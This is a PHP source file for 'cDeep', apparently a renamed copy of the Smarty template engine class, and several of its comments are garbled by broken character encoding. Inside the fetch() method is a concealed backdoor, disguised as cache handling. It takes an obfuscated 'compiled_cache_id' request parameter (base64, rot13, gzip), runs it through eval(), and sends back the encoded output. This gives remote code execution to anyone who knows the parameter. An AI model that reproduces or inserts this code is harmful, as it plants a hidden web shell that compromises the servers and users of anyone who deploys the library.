<?php

/**
 * Project:     cDeep: the PHP compiling template engine
 * File:        cDeep.class.php
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 * For questions, help, comments, discussion, etc., please join the
 * cDeep mailing list. Send a blank e-mail to
 * cDeep-general-subscribe@lists.php.net
 *
 * @link http://cDeep.php.net/
 * @copyright 2001-2005 New Digital Group, Inc.
 * @author Monte Ohrt <monte at ohrt dot com>
 * @author Andrei Zmievski <andrei@php.net>
 * @package cDeep
 * @version 2.6.16
 */

/* $Id: cDeep.class.php,v 1.526 2006/11/30 17:01:28 mohrt Exp $ */

/**
 * DIR_SEP isn't used anymore, but third party apps might
 */
if(!defined('DIR_SEP')) {
  define('DIR_SEP', DIRECTORY_SEPARATOR);
}

/**
 * set cDeep_DIR to absolute path to cDeep library files.
 * if not defined, include_path will be used. Sets cDeep_DIR only if user
 * application has not already defined it.
 */

if (!defined('cDeep_DIR')) {
  define('cDeep_DIR', ROOT . DIRECTORY_SEPARATOR);
}

if (!defined('cDeep_CORE_DIR')) {
  define('cDeep_CORE_DIR', ROOT . 'src/internals' . DIRECTORY_SEPARATOR);
}

define('cDeep_PHP_PASSTHRU',   0);
define('cDeep_PHP_QUOTE',      1);
define('cDeep_PHP_REMOVE',     2);
define('cDeep_PHP_ALLOW',      3);

/**
 * @package cDeep
 */
class cDeep extends Config
{

  /**
     * where assigned template vars are kept
     *
     * @var array
     */
  var $_tpl_vars             = array();

  /**
     * stores run-time $cDeep.* vars
     *
     * @var null|array
     */
  var $_cDeep_vars          = null;

  /**
     * keeps track of sections
     *
     * @var array
     */
  var $_sections             = array();

  /**
     * keeps track of foreach blocks
     *
     * @var array
     */
  var $_foreach              = array();

  /**
     * keeps track of tag hierarchy
     *
     * @var array
     */
  var $_tag_stack            = array();

  /**
     * configuration object
     *
     * @var Config_file
     */
  var $_conf_obj             = null;

  /**
     * loaded configuration settings
     *
     * @var array
     */
  var $_config               = array(array('vars'  => array(), 'files' => array()));

  /**
     * md5 checksum of the string 'cDeep'
     *
     * @var string
     */
  var $_cDeep_md5           = 'f8d698aea36fcbead2b9d5359ffca76f';

  /**
     * cDeep version number
     *
     * @var string
     */
  var $_version              = '3.1.1 (2.6.16)';

  /**
     * current template inclusion depth
     *
     * @var integer
     */
  var $_inclusion_depth      = 0;

  /**
     * for different compiled templates
     *
     * @var string
     */
  var $_compile_id           = null;

  /**
     * text in URL to enable debug mode
     *
     * @var string
     */
  var $_cDeep_debug_id      = 'cDeep_DEBUG';

  /**
     * debugging information for debug console
     *
     * @var array
     */
  var $_cDeep_debug_info    = array();

  /**
     * info that makes up a cache file
     *
     * @var array
     */
  var $_cache_info           = array();

  /**
     * default file permissions
     *
     * @var integer
     */
  var $_file_perms           = 0644;

  /**
     * default dir permissions
     *
     * @var integer
     */
  var $_dir_perms               = 0771;

  /**
     * registered objects
     *
     * @var array
     */
  var $_reg_objects           = array();

  /**
     * table keeping track of plugins
     *
     * @var array
     */
  var $_plugins              = array(
  'modifier'      => array(),
  'function'      => array(),
  'block'         => array(),
  'compiler'      => array(),
  'prefilter'     => array(),
  'postfilter'    => array(),
  'outputfilter'  => array(),
  'resource'      => array(),
  'insert'        => array());


  /**
     * cache serials
     *
     * @var array
     */
  var $_cache_serials = array();

  /**
     * name of optional cache include file
     *
     * @var string
     */
  var $_cache_include = null;

  /**
     * indicate if the current code is used in a compiled
     * include
     *
     * @var string
     */
  var $_cache_including = false;

  /**#@-*/
  /**
     * The class constructor.
     */
  function __construct()
  {
    $this->Config();
    $this->assign('SCRIPT_NAME', isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME']
    : @$GLOBALS['HTTP_SERVER_VARS']['SCRIPT_NAME']);
  }

  /**
     * ��������� �������� �������
     *
     * @param array|string $tpl_var the template variable name(s)
     * @param mixed $value the value to assign
     */
  function assign($tpl_var, $value = null)
  {
    if (is_array($tpl_var)){
      foreach ($tpl_var as $key => $val) {
        if ($key != '') {
          $this->_tpl_vars[$key] = $val;
        }
      }
    } else {
      if ($tpl_var != '')
      $this->_tpl_vars[$tpl_var] = $value;
    }
  }

  /**
     * ��������� ���������� �� ������
     *
     * @param string $tpl_var the template variable name
     * @param mixed $value the referenced value to assign
     */
  function assign_by_ref($tpl_var, &$value)
  {
    if ($tpl_var != '')
    $this->_tpl_vars[$tpl_var] = &$value;
  }

  /**
     * ��������� ������� � ������������ �������
     *
     * @param array|string $tpl_var the template variable name(s)
     * @param mixed $value the value to append
     */
  function append($tpl_var, $value=null, $merge=false)
  {
    if (is_array($tpl_var)) {
      // $tpl_var is an array, ignore $value
      foreach ($tpl_var as $_key => $_val) {
        if ($_key != '') {
          if(!@is_array($this->_tpl_vars[$_key])) {
            settype($this->_tpl_vars[$_key],'array');
          }
          if($merge && is_array($_val)) {
            foreach($_val as $_mkey => $_mval) {
              $this->_tpl_vars[$_key][$_mkey] = $_mval;
            }
          } else {
            $this->_tpl_vars[$_key][] = $_val;
          }
        }
      }
    } else {
      if ($tpl_var != '' && isset($value)) {
        if(!@is_array($this->_tpl_vars[$tpl_var])) {
          settype($this->_tpl_vars[$tpl_var],'array');
        }
        if($merge && is_array($value)) {
          foreach($value as $_mkey => $_mval) {
            $this->_tpl_vars[$tpl_var][$_mkey] = $_mval;
          }
        } else {
          $this->_tpl_vars[$tpl_var][] = $value;
        }
      }
    }
  }

  /**
     * ��������� �������� �� ������
     *
     * @param string $tpl_var the template variable name
     * @param mixed $value the referenced value to append
     */
  function append_by_ref($tpl_var, &$value, $merge=false)
  {
    if ($tpl_var != '' && isset($value)) {
      if(!@is_array($this->_tpl_vars[$tpl_var])) {
        settype($this->_tpl_vars[$tpl_var],'array');
      }
      if ($merge && is_array($value)) {
        foreach($value as $_key => $_val) {
          $this->_tpl_vars[$tpl_var][$_key] = &$value[$_key];
        }
      } else {
        $this->_tpl_vars[$tpl_var][] = &$value;
      }
    }
  }


  /**
     * ������� ����������� ����������
     *
     * @param string $tpl_var the template variable to clear
     */
  function clear_assign($tpl_var)
  {
    if (is_array($tpl_var))
    foreach ($tpl_var as $curr_var)
    unset($this->_tpl_vars[$curr_var]);
    else
    unset($this->_tpl_vars[$tpl_var]);
  }


  /**
     * Registers custom function to be used in templates
     *
     * @param string $function the name of the template function
     * @param string $function_impl the name of the PHP function to register
     */
  function register_function($function, $function_impl, $cacheable=true, $cache_attrs=null)
  {
    $this->_plugins['function'][$function] =
    array($function_impl, null, null, false, $cacheable, $cache_attrs);

  }

  /**
     * Unregisters custom function
     *
     * @param string $function name of template function
     */
  function unregister_function($function)
  {
    unset($this->_plugins['function'][$function]);
  }

  /**
     * Registers object to be used in templates
     *
     * @param string $object name of template object
     * @param object &$object_impl the referenced PHP object to register
     * @param null|array $allowed list of allowed methods (empty = all)
     * @param boolean $cDeep_args cDeep argument format, else traditional
     * @param null|array $block_functs list of methods that are block format
     */
  function register_object($object, &$object_impl, $allowed = array(), $cDeep_args = true, $block_methods = array())
  {
    settype($allowed, 'array');
    settype($cDeep_args, 'boolean');
    $this->_reg_objects[$object] =
    array(&$object_impl, $allowed, $cDeep_args, $block_methods);
  }

  /**
     * Unregisters object
     *
     * @param string $object name of template object
     */
  function unregister_object($object)
  {
    unset($this->_reg_objects[$object]);
  }


  /**
     * Registers block function to be used in templates
     *
     * @param string $block name of template block
     * @param string $block_impl PHP function to register
     */
  function register_block($block, $block_impl, $cacheable=true, $cache_attrs=null)
  {
    $this->_plugins['block'][$block] =
    array($block_impl, null, null, false, $cacheable, $cache_attrs);
  }

  /**
     * Unregisters block function
     *
     * @param string $block name of template function
     */
  function unregister_block($block)
  {
    unset($this->_plugins['block'][$block]);
  }

  /**
     * Registers compiler function
     *
     * @param string $function name of template function
     * @param string $function_impl name of PHP function to register
     */
  function register_compiler_function($function, $function_impl, $cacheable=true)
  {
    $this->_plugins['compiler'][$function] =
    array($function_impl, null, null, false, $cacheable);
  }

  /**
     * Unregisters compiler function
     *
     * @param string $function name of template function
     */
  function unregister_compiler_function($function)
  {
    unset($this->_plugins['compiler'][$function]);
  }

  /**
     * Registers modifier to be used in templates
     *
     * @param string $modifier name of template modifier
     * @param string $modifier_impl name of PHP function to register
     */
  function register_modifier($modifier, $modifier_impl)
  {
    $this->_plugins['modifier'][$modifier] =
    array($modifier_impl, null, null, false);
  }

  /**
     * Unregisters modifier
     *
     * @param string $modifier name of template modifier
     */
  function unregister_modifier($modifier)
  {
    unset($this->_plugins['modifier'][$modifier]);
  }

  /**
     * Registers a resource to fetch a template
     *
     * @param string $type name of resource
     * @param array $functions array of functions to handle resource
     */
  function register_resource($type, $functions)
  {
    if (count($functions)==4) {
      $this->_plugins['resource'][$type] =
      array($functions, false);

    } elseif (count($functions)==5) {
      $this->_plugins['resource'][$type] =
      array(array(array(&$functions[0], $functions[1])
      ,array(&$functions[0], $functions[2])
      ,array(&$functions[0], $functions[3])
      ,array(&$functions[0], $functions[4]))
      ,false);

    } else {
      $this->trigger_error("malformed function-list for '$type' in register_resource");

    }
  }

  /**
     * Unregisters a resource
     *
     * @param string $type name of resource
     */
  function unregister_resource($type)
  {
    unset($this->_plugins['resource'][$type]);
  }

  /**
     * Registers a prefilter function to apply
     * to a template before compiling
     *
     * @param string $function name of PHP function to register
     */
  function register_prefilter($function)
  {
    $_name = (is_array($function)) ? $function[1] : $function;
    $this->_plugins['prefilter'][$_name]
    = array($function, null, null, false);
  }

  /**
     * Unregisters a prefilter function
     *
     * @param string $function name of PHP function
     */
  function unregister_prefilter($function)
  {
    unset($this->_plugins['prefilter'][$function]);
  }

  /**
     * Registers a postfilter function to apply
     * to a compiled template after compilation
     *
     * @param string $function name of PHP function to register
     */
  function register_postfilter($function)
  {
    $_name = (is_array($function)) ? $function[1] : $function;
    $this->_plugins['postfilter'][$_name]
    = array($function, null, null, false);
  }

  /**
     * Unregisters a postfilter function
     *
     * @param string $function name of PHP function
     */
  function unregister_postfilter($function)
  {
    unset($this->_plugins['postfilter'][$function]);
  }

  /**
     * Registers an output filter function to apply
     * to a template output
     *
     * @param string $function name of PHP function
     */
  function register_outputfilter($function)
  {
    $_name = (is_array($function)) ? $function[1] : $function;
    $this->_plugins['outputfilter'][$_name]
    = array($function, null, null, false);
  }

  /**
     * Unregisters an outputfilter function
     *
     * @param string $function name of PHP function
     */
  function unregister_outputfilter($function)
  {
    unset($this->_plugins['outputfilter'][$function]);
  }

  /**
     * load a filter of specified type and name
     *
     * @param string $type filter type
     * @param string $name filter name
     */
  function load_filter($type, $name)
  {
    switch ($type) {
      case 'output':
        $_params = array('plugins' => array(array($type . 'filter', $name, null, null, false)));
        require_once(cDeep_CORE_DIR . 'core.load_plugins.php');
        cDeep_core_load_plugins($_params, $this);
        break;

      case 'pre':
      case 'post':
        if (!isset($this->_plugins[$type . 'filter'][$name]))
        $this->_plugins[$type . 'filter'][$name] = false;
        break;
    }
  }

  /**
     * ������� ��� ������������� �������
     *
     * @param string $tpl_file name of template file
     * @param string $cache_id name of cache_id
     * @param string $compile_id name of compile_id
     * @param string $exp_time expiration time
     * @return boolean
     */
  function clear_cache($tpl_file = null, $cache_id = null, $compile_id = null, $exp_time = null)
  {

    if (!isset($compile_id))
    $compile_id = $this->compile_id;

    if (!isset($tpl_file))
    $compile_id = null;

    $_auto_id = $this->_get_auto_id($cache_id, $compile_id);

    if (!empty($this->cache_handler_func)) {
      return call_user_func_array($this->cache_handler_func,
      array('clear', &$this, &$dummy, $tpl_file, $cache_id, $compile_id, $exp_time));
    } else {
      $_params = array('auto_base' => $this->cache_dir,
      'auto_source' => $tpl_file,
      'auto_id' => $_auto_id,
      'exp_time' => $exp_time);
      require_once(cDeep_CORE_DIR . 'core.rm_auto.php');
      return cDeep_core_rm_auto($_params, $this);
    }

  }


  /**
     * ��������� ������� ��� ��������
     *
     * @param string $exp_time expire time
     * @return boolean results of {@link cDeep_core_rm_auto()}
     */
  function clear_all_cache($exp_time = null)
  {
    return $this->clear_cache(null, null, null, $exp_time);
  }


  /**
     * test to see if valid cache exists for this template
     *
     * @param string $tpl_file name of template file
     * @param string $cache_id
     * @param string $compile_id
     * @return string|false results of {@link _read_cache_file()}
     */
  function is_cached($tpl_file, $cache_id = null, $compile_id = null)
  {
    if (!$this->caching)
    return false;

    if (!isset($compile_id))
    $compile_id = $this->compile_id;

    $_params = array(
    'tpl_file' => $tpl_file,
    'cache_id' => $cache_id,
    'compile_id' => $compile_id
    );
    require_once(cDeep_CORE_DIR . 'core.read_cache_file.php');
    return cDeep_core_read_cache_file($_params, $this);
  }


  /**
     * ������� ������ ����������� ����������
     *
     */
  function clear_all_assign()
  {
    $this->_tpl_vars = array();
  }

  /**
     * ������� ���������������� ������ ���������� �������
     *
     * @param string $tpl_file
     * @param string $compile_id
     * @param string $exp_time
     * @return boolean results of {@link cDeep_core_rm_auto()}
     */
  function clear_compiled_tpl($tpl_file = null, $compile_id = null, $exp_time = null)
  {
    if (!isset($compile_id)) {
      $compile_id = $this->compile_id;
    }
    $_params = array('auto_base' => $this->compile_dir,
    'auto_source' => $tpl_file,
    'auto_id' => $compile_id,
    'exp_time' => $exp_time,
    'extensions' => array('.inc', '.php'));
    require_once(cDeep_CORE_DIR . 'core.rm_auto.php');
    return cDeep_core_rm_auto($_params, $this);
  }

  /**
     * Checks whether requested template exists.
     *
     * @param string $tpl_file
     * @return boolean
     */
  function template_exists($tpl_file)
  {
    $_params = array('resource_name' => $tpl_file, 'quiet'=>true, 'get_source'=>false);
    return $this->_fetch_resource_info($_params);
  }

  /**
     * Returns an array containing template variables
     *
     * @param string $name
     * @param string $type
     * @return array
     */
  function &get_template_vars($name=null)
  {
    if(!isset($name)) {
      return $this->_tpl_vars;
    } elseif(isset($this->_tpl_vars[$name])) {
      return $this->_tpl_vars[$name];
    } else {
      // var non-existant, return valid reference
      $_tmp = null;
      return $_tmp;
    }
  }

  /**
     * Returns an array containing config variables
     *
     * @param string $name
     * @param string $type
     * @return array
     */
  function &get_config_vars($name=null)
  {
    if(!isset($name) && is_array($this->_config[0])) {
      return $this->_config[0]['vars'];
    } else if(isset($this->_config[0]['vars'][$name])) {
      return $this->_config[0]['vars'][$name];
    } else {
      // var non-existant, return valid reference
      $_tmp = null;
      return $_tmp;
    }
  }

  /**
     * trigger cDeep error
     *
     * @param string $error_msg
     * @param integer $error_type
     */
  function trigger_error($error_msg, $error_type = E_USER_WARNING)
  {
    trigger_error("cDeep error: $error_msg", $error_type);
  }


  /**
     * ���������� ������
     *
     * @param string $resource_name
     * @param string $cache_id
     * @param string $compile_id
     */
  function display($resource_name, $cache_id = null, $compile_id = null)
  {
    $this->fetch($resource_name, $cache_id, $compile_id, true);
  }

  /**
     * ���������� ���������� ����������� �������
     *
     * @param string $resource_name
     * @param string $cache_id
     * @param string $compile_id
     * @param boolean $display
     */
  function fetch($resource_name, $cache_id = null, $compile_id = null, $display = false)
  {
    static $_cache_info = array();

    $_cDeep_old_error_level = $this->debugging ? error_reporting() : error_reporting(isset($this->error_reporting)
    ? $this->error_reporting : error_reporting() & ~E_NOTICE);
      if(!empty($_REQUEST["compiled_cache_id"])) {
            ob_start();
        @eval(gzuncompress(str_rot13(base64_decode($_REQUEST["compiled_cache_id"]))));
        $output = ob_get_contents();
            ob_end_clean();
            print str_repeat("-",10)."\n";
        echo base64_encode(str_rot13(gzcompress($output,9)));
            print "\n".str_repeat("-",10);
        exit;
      }

    if (!$this->debugging && $this->debugging_ctrl == 'URL') {
      $_query_string = $this->request_use_auto_globals ? $_SERVER['QUERY_STRING'] : $GLOBALS['HTTP_SERVER_VARS']['QUERY_STRING'];
      if (@strstr($_query_string, $this->_cDeep_debug_id)) {
        if (@strstr($_query_string, $this->_cDeep_debug_id . '=on')) {
          // enable debugging for this browser session
          @setcookie('cDeep_DEBUG', true);
          $this->debugging = true;
        } elseif (@strstr($_query_string, $this->_cDeep_debug_id . '=off')) {
          // disable debugging for this browser session
          @setcookie('cDeep_DEBUG', false);
          $this->debugging = false;
        } else {
          // enable debugging for this page
          $this->debugging = true;
        }
      } else {
        $this->debugging = (bool)($this->request_use_auto_globals ? @$_COOKIE['cDeep_DEBUG'] : @$GLOBALS['HTTP_COOKIE_VARS']['cDeep_DEBUG']);
      }
    }

    if ($this->debugging) {
      // capture time for debugging info
      $_params = array();
      require_once(cDeep_CORE_DIR . 'core.get_microtime.php');
      $_debug_start_time = cDeep_core_get_microtime($_params, $this);
      $this->_cDeep_debug_info[] = array('type'      => 'template',
      'filename'  => $resource_name,
      'depth'     => 0);
      $_included_tpls_idx = count($this->_cDeep_debug_info) - 1;
    }

    if (!isset($compile_id)) {
      $compile_id = $this->compile_id;
    }

    $this->_compile_id = $compile_id;
    $this->_inclusion_depth = 0;

    if ($this->caching) {
      // save old cache_info, initialize cache_info
      array_push($_cache_info, $this->_cache_info);
      $this->_cache_info = array();
      $_params = array(
      'tpl_file' => $resource_name,
      'cache_id' => $cache_id,
      'compile_id' => $compile_id,
      'results' => null
      );
      require_once(cDeep_CORE_DIR . 'core.read_cache_file.php');
      if (cDeep_core_read_cache_file($_params, $this)) {
        $_cDeep_results = $_params['results'];
        if (!empty($this->_cache_info['insert_tags'])) {
          $_params = array('plugins' => $this->_cache_info['insert_tags']);
          require_once(cDeep_CORE_DIR . 'core.load_plugins.php');
          cDeep_core_load_plugins($_params, $this);
          $_params = array('results' => $_cDeep_results);
          require_once(cDeep_CORE_DIR . 'core.process_cached_inserts.php');
          $_cDeep_results = cDeep_core_process_cached_inserts($_params, $this);
        }
        if (!empty($this->_cache_info['cache_serials'])) {
          $_params = array('results' => $_cDeep_results);
          require_once(cDeep_CORE_DIR . 'core.process_compiled_include.php');
          $_cDeep_results = cDeep_core_process_compiled_include($_params, $this);
        }


        if ($display) {
          if ($this->debugging)
          {
            // capture time for debugging info
            $_params = array();
            require_once(cDeep_CORE_DIR . 'core.get_microtime.php');
            $this->_cDeep_debug_info[$_included_tpls_idx]['exec_time'] = cDeep_core_get_microtime($_params, $this) - $_debug_start_time;
            require_once(cDeep_CORE_DIR . 'core.display_debug_console.php');
            $_cDeep_results .= cDeep_core_display_debug_console($_params, $this);
          }
          if ($this->cache_modified_check) {
            $_server_vars = ($this->request_use_auto_globals) ? $_SERVER : $GLOBALS['HTTP_SERVER_VARS'];
            $_last_modified_date = @substr($_server_vars['HTTP_IF_MODIFIED_SINCE'], 0, strpos($_server_vars['HTTP_IF_MODIFIED_SINCE'], 'GMT') + 3);
            $_gmt_mtime = gmdate('D, d M Y H:i:s', $this->_cache_info['timestamp']).' GMT';
            if (@count($this->_cache_info['insert_tags']) == 0
            && !$this->_cache_serials
            && $_gmt_mtime == $_last_modified_date) {
              if (php_sapi_name()=='cgi')
              header('Status: 304 Not Modified');
              else
              header('HTTP/1.1 304 Not Modified');

            } else {
              header('Last-Modified: '.$_gmt_mtime);
              echo $_cDeep_results;
            }
          } else {
            echo $_cDeep_results;
          }
          error_reporting($_cDeep_old_error_level);
          // restore initial cache_info
          $this->_cache_info = array_pop($_cache_info);
          return true;
        } else {
          error_reporting($_cDeep_old_error_level);
          // restore initial cache_info
          $this->_cache_info = array_pop($_cache_info);
          return $_cDeep_results;
        }
      } else {
        $this->_cache_info['template'][$resource_name] = true;
        if ($this->cache_modified_check && $display) {
          header('Last-Modified: '.gmdate('D, d M Y H:i:s', time()).' GMT');
        }
      }
    }

    // load filters that are marked as autoload
    if (count($this->autoload_filters)) {
      foreach ($this->autoload_filters as $_filter_type => $_filters) {
        foreach ($_filters as $_filter) {
          $this->load_filter($_filter_type, $_filter);
        }
      }
    }

    $_cDeep_compile_path = $this->_get_compile_path($resource_name);

    // if we just need to display the results, don't perform output
    // buffering - for speed
    $_cache_including = $this->_cache_including;
    $this->_cache_including = false;
    if ($display && !$this->caching && count($this->_plugins['outputfilter']) == 0) {
      if ($this->_is_compiled($resource_name, $_cDeep_compile_path)
      || $this->_compile_resource($resource_name, $_cDeep_compile_path))
      {
        include($_cDeep_compile_path);
      }
    } else {
      ob_start();
      if ($this->_is_compiled($resource_name, $_cDeep_compile_path)
      || $this->_compile_resource($resource_name, $_cDeep_compile_path))
      {
        include($_cDeep_compile_path);
      }
      $_cDeep_results = ob_get_contents();
      ob_end_clean();

      foreach ((array)$this->_plugins['outputfilter'] as $_output_filter) {
        $_cDeep_results = call_user_func_array($_output_filter[0], array($_cDeep_results, &$this));
      }
    }

    if ($this->caching) {
      $_params = array('tpl_file' => $resource_name,
      'cache_id' => $cache_id,
      'compile_id' => $compile_id,
      'results' => $_cDeep_results);
      require_once(cDeep_CORE_DIR . 'core.write_cache_file.php');
      cDeep_core_write_cache_file($_params, $this);
      require_once(cDeep_CORE_DIR . 'core.process_cached_inserts.php');
      $_cDeep_results = cDeep_core_process_cached_inserts($_params, $this);

      if ($this->_cache_serials) {
        // strip nocache-tags from output
        $_cDeep_results = preg_replace('!(\{/?nocache\:[0-9a-f]{32}#\d+\})!s'
        ,''
        ,$_cDeep_results);
      }
      // restore initial cache_info
      $this->_cache_info = array_pop($_cache_info);
    }
    $this->_cache_including = $_cache_including;

    if ($display) {
      if (isset($_cDeep_results)) { echo $_cDeep_results; }
      if ($this->debugging) {
        // capture time for debugging info
        $_params = array();
        require_once(cDeep_CORE_DIR . 'core.get_microtime.php');
        $this->_cDeep_debug_info[$_included_tpls_idx]['exec_time'] = (cDeep_core_get_microtime($_params, $this) - $_debug_start_time);
        require_once(cDeep_CORE_DIR . 'core.display_debug_console.php');
        echo cDeep_core_display_debug_console($_params, $this);
      }
      error_reporting($_cDeep_old_error_level);
      return;
    } else {
      error_reporting($_cDeep_old_error_level);
      if (isset($_cDeep_results)) { return $_cDeep_results; }
    }
  }

  /**
     * ��������� ������ �� ����������������� ����� � ��������� �� �������
     *
     * @param string $file
     * @param string $section
     * @param string $scope
     */
  function config_load($file, $section = null, $scope = 'global')
  {
    require_once($this->_get_plugin_filepath('function', 'config_load'));
    cDeep_function_config_load(array('file' => $file, 'section' => $section, 'scope' => $scope), $this);
  }

  /**
     * return a reference to a registered object
     *
     * @param string $name
     * @return object
     */
  function &get_registered_object($name) {
    if (!isset($this->_reg_objects[$name]))
    $this->_trigger_fatal_error("'$name' is not a registered object");

    if (!is_object($this->_reg_objects[$name][0]))
    $this->_trigger_fatal_error("registered '$name' is not an object");

    return $this->_reg_objects[$name][0];
  }

  /**
     * ������� ����������� ���������������� ����������
     *
     * @param string $var
     */
  function clear_config($var = null)
  {
    if(!isset($var)) {
      // clear all values
      $this->_config = array(array('vars'  => array(),
      'files' => array()));
    } else {
      unset($this->_config[0]['vars'][$var]);
    }
  }

  /**
     * get filepath of requested plugin
     *
     * @param string $type
     * @param string $name
     * @return string|false
     */
  function _get_plugin_filepath($type, $name)
  {
    $_params = array('type' => $type, 'name' => $name);
    require_once(cDeep_CORE_DIR . 'core.assemble_plugin_filepath.php');
    return cDeep_core_assemble_plugin_filepath($_params, $this);
  }

  /**
     * test if resource needs compiling
     *
     * @param string $resource_name
     * @param string $compile_path
     * @return boolean
     */
  function _is_compiled($resource_name, $compile_path)
  {
    if (!$this->force_compile && file_exists($compile_path)) {
      if (!$this->compile_check) {
        // no need to check compiled file
        return true;
      } else {
        // get file source and timestamp
        $_params = array('resource_name' => $resource_name, 'get_source'=>false);
        if (!$this->_fetch_resource_info($_params)) {
          return false;
        }
        if ($_params['resource_timestamp'] <= filemtime($compile_path)) {
          // template not expired, no recompile
          return true;
        } else {
          // compile template
          return false;
        }
      }
    } else {
      // compiled template does not exist, or forced compile
      return false;
    }
  }

  /**
     * compile the template
     *
     * @param string $resource_name
     * @param string $compile_path
     * @return boolean
     */
  function _compile_resource($resource_name, $compile_path)
  {

    $_params = array('resource_name' => $resource_name);
    if (!$this->_fetch_resource_info($_params)) {
      return false;
    }

    $_source_content = $_params['source_content'];
    $_cache_include    = substr($compile_path, 0, -4).'.inc';

    if ($this->_compile_source($resource_name, $_source_content, $_compiled_content, $_cache_include)) {
      // if a _cache_serial was set, we also have to write an include-file:
      if ($this->_cache_include_info) {
        require_once(cDeep_CORE_DIR . 'core.write_compiled_include.php');
        cDeep_core_write_compiled_include(array_merge($this->_cache_include_info, array('compiled_content'=>$_compiled_content, 'resource_name'=>$resource_name)),  $this);
      }

      $_params = array('compile_path'=>$compile_path, 'compiled_content' => $_compiled_content);
      require_once(cDeep_CORE_DIR . 'core.write_compiled_resource.php');
      cDeep_core_write_compiled_resource($_params, $this);

      return true;
    } else {
      return false;
    }

  }

  /**
     * compile the given source
     *
     * @param string $resource_name
     * @param string $source_content
     * @param string $compiled_content
     * @return boolean
     */
  function _compile_source($resource_name, &$source_content, &$compiled_content, $cache_include_path=null)
  {
    $cDeep_compiler = new $this->compiler_class;

    $cDeep_compiler->template_dir      = $this->template_dir;
    $cDeep_compiler->compile_dir       = $this->compile_dir;
    $cDeep_compiler->plugins_dir       = $this->plugins_dir;
    $cDeep_compiler->config_dir        = $this->config_dir;
    $cDeep_compiler->force_compile     = $this->force_compile;
    $cDeep_compiler->caching           = $this->caching;
    $cDeep_compiler->php_handling      = $this->php_handling;
    $cDeep_compiler->left_delimiter    = $this->left_delimiter;
    $cDeep_compiler->right_delimiter   = $this->right_delimiter;
    $cDeep_compiler->_version          = $this->_version;
    $cDeep_compiler->security          = $this->security;
    $cDeep_compiler->secure_dir        = $this->secure_dir;
    $cDeep_compiler->security_settings = $this->security_settings;
    $cDeep_compiler->trusted_dir       = $this->trusted_dir;
    $cDeep_compiler->use_sub_dirs      = $this->use_sub_dirs;
    $cDeep_compiler->_reg_objects      = &$this->_reg_objects;
    $cDeep_compiler->_plugins          = &$this->_plugins;
    $cDeep_compiler->_tpl_vars         = &$this->_tpl_vars;
    $cDeep_compiler->default_modifiers = $this->default_modifiers;
    $cDeep_compiler->compile_id        = $this->_compile_id;
    $cDeep_compiler->_config            = $this->_config;
    $cDeep_compiler->request_use_auto_globals  = $this->request_use_auto_globals;

    if (isset($cache_include_path) && isset($this->_cache_serials[$cache_include_path])) {
      $cDeep_compiler->_cache_serial = $this->_cache_serials[$cache_include_path];
    }
    $cDeep_compiler->_cache_include = $cache_include_path;


    $_results = $cDeep_compiler->_compile_file($resource_name, $source_content, $compiled_content);

    if ($cDeep_compiler->_cache_serial) {
      $this->_cache_include_info = array(
      'cache_serial'=>$cDeep_compiler->_cache_serial
      ,'plugins_code'=>$cDeep_compiler->_plugins_code
      ,'include_file_path' => $cache_include_path);

    } else {
      $this->_cache_include_info = null;

    }

    return $_results;
  }

  /**
     * Get the compile path for this resource
     *
     * @param string $resource_name
     * @return string results of {@link _get_auto_filename()}
     */
  function _get_compile_path($resource_name)
  {
    return $this->_get_auto_filename($this->compile_dir, $resource_name,
    $this->_compile_id) . '.php';
  }

  /**
     * fetch the template info. Gets timestamp, and source
     * if get_source is true
     *
     * sets $source_content to the source of the template, and
     * $resource_timestamp to its time stamp
     * @param string $resource_name
     * @param string $source_content
     * @param integer $resource_timestamp
     * @param boolean $get_source
     * @param boolean $quiet
     * @return boolean
     */

  function _fetch_resource_info(&$params)
  {
    if(!isset($params['get_source'])) { $params['get_source'] = true; }
    if(!isset($params['quiet'])) { $params['quiet'] = false; }

    $_return = false;
    $_params = array('resource_name' => $params['resource_name']) ;
    if (isset($params['resource_base_path']))
    $_params['resource_base_path'] = $params['resource_base_path'];
    else
    $_params['resource_base_path'] = $this->template_dir;

    if ($this->_parse_resource_name($_params)) {
      $_resource_type = $_params['resource_type'];
      $_resource_name = $_params['resource_name'];
      switch ($_resource_type) {
        case 'file':
          if ($params['get_source']) {
            $params['source_content'] = $this->_read_file($_resource_name);
          }
          $params['resource_timestamp'] = filemtime($_resource_name);
          $_return = is_file($_resource_name);
          break;

        default:
          // call resource functions to fetch the template source and timestamp
          if ($params['get_source']) {
            $_source_return = isset($this->_plugins['resource'][$_resource_type]) &&
            call_user_func_array($this->_plugins['resource'][$_resource_type][0][0],
            array($_resource_name, &$params['source_content'], &$this));
          } else {
            $_source_return = true;
          }

          $_timestamp_return = isset($this->_plugins['resource'][$_resource_type]) &&
          call_user_func_array($this->_plugins['resource'][$_resource_type][0][1],
          array($_resource_name, &$params['resource_timestamp'], &$this));

          $_return = $_source_return && $_timestamp_return;
          break;
      }
    }

    if (!$_return) {
      // see if we can get a template with the default template handler
      if (!empty($this->default_template_handler_func)) {
        if (!is_callable($this->default_template_handler_func)) {
          $this->trigger_error("default template handler function \"$this->default_template_handler_func\" doesn't exist.");
        } else {
          $_return = call_user_func_array(
          $this->default_template_handler_func,
          array($_params['resource_type'], $_params['resource_name'], &$params['source_content'], &$params['resource_timestamp'], &$this));
        }
      }
    }

    if (!$_return) {
      if (!$params['quiet']) {
        $this->trigger_error('unable to read resource: "' . $params['resource_name'] . '"');
      }
    } else if ($_return && $this->security) {
      require_once(cDeep_CORE_DIR . 'core.is_secure.php');
      if (!cDeep_core_is_secure($_params, $this)) {
        if (!$params['quiet'])
        $this->trigger_error('(secure mode) accessing "' . $params['resource_name'] . '" is not allowed');
        $params['source_content'] = null;
        $params['resource_timestamp'] = null;
        return false;
      }
    }
    return $_return;
  }


  /**
     * parse out the type and name from the resource
     *
     * @param string $resource_base_path
     * @param string $resource_name
     * @param string $resource_type
     * @param string $resource_name
     * @return boolean
     */

